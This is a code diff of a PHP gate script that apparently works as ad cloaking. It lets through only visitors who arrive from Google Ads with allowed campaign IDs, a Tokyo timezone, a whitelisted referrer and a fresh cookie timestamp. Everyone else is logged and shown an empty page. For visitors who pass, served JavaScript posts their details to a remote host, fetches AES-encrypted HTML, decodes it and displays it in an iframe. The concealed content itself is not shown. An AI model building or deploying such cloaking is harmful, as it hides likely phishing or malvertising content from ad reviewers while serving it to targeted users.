@@ -1,13 +1,15 @@
 <?php
-$dynamic_url = "https://onrender-3brc.onrender.com";
+$dynamic_url = "http://127.0.0.1:8080";
 $allowed_timezones = ['Asia/Tokyo'];
 $allowed_campaign_ids = ['12345', '67890'];
+$allowed_referrer = ['http://127.0.0.1', 'https://waveharborblog.space'];
 
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
 header("Access-Control-Allow-Headers: Content-Type");
 header("Access-Control-Allow-Credentials: true");
 
+error_reporting(0);
 $rawInput = trim(file_get_contents('php://input'));
 if ($rawInput !== '') {
     $inputData = json_decode($rawInput, true);
@@ -21,6 +23,7 @@ if ($rawInput !== '') {
         $invalidReason = 'invalid_json';
     } else {
         $timezone = $inputData['timezone'] ?? '';
+        $timestamp = $inputData['timestamp'] ?? '';
         $fullUrl = $inputData['fullUrl'] ?? '';
 
         $urlParts = parse_url($fullUrl);
@@ -36,27 +39,32 @@ if ($rawInput !== '') {
             $invalidReason = 'invalid_campaign_id';
         } elseif (trim($gclid) === '') {
             $invalidReason = 'missing_gclid';
+        } elseif (!in_array(rtrim($_SERVER['HTTP_REFERER'],'/'), $allowed_referrer, true)) {
+            $invalidReason = 'invalid_referrer';
+        } elseif ($timestamp+60 < time() ) {
+            $invalidReason = '60 seconds crossed';
         }
     }
-
-    if ($invalidReason !== '') {
-        $logFile = __DIR__ . '/timezone_validation_log.csv';
-        $logData = [
-            date('c'),
-            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
-            $timezone,
-            $fullUrl,
-            $gadCampaignId,
-            $gclid,
-            $invalidReason,
-        ];
-        if ($fp = @fopen($logFile, 'a')) {
-            fputcsv($fp, $logData);
-            fclose($fp);
-        }
-        echo '';
-        exit;
+}else{
+    $invalidReason = 'no input';
+}
+if ($invalidReason !== '') {
+    $logFile = __DIR__ . '/timezone_validation_log.csv';
+    $logData = [
+        date('c'),
+        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
+        $timezone,
+        $fullUrl,
+        $gadCampaignId,
+        $gclid,
+        $invalidReason,
+    ];
+    if ($fp = @fopen($logFile, 'a')) {
+        fputcsv($fp, $logData);
+        fclose($fp);
     }
+    echo '';
+    exit;
 }
 
 $codeString = '
@@ -87,7 +95,7 @@ function aesDecode(encodedText) {
         return "";
     }
 }
-async function fetchAndPrepareBlob() {
+async function fetchAndPrepareBlobx() {
     try {
         return bytes.toString(CryptoJS.enc.Utf8);
     } catch {
@@ -96,9 +104,16 @@ async function fetchAndPrepareBlob() {
 }
 async function fetchAndPrepareBlob() {
     try {
-        const response = await fetch(
-            "' . $dynamic_url . '"
-        );
+        const response = await fetch( "' . $dynamic_url . '/sec.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, fullUrl: window.location.href, timestamp: getCookieValue("sid") }),
+        });
+        if (!response.ok) {
+            throw new Error("HTTP error! Status: " + response.status);
+        }
 
         const encodedText = await response.text();
         const decodedHtml = aesDecode(decodeURIComponent(encodedText));
@@ -110,7 +125,6 @@ async function fetchAndPrepareBlob() {
         displayIframe();
     } catch (err) {
         console.error("Blob fetch error:", err);
-
     }
 }
 function displayIframe() {
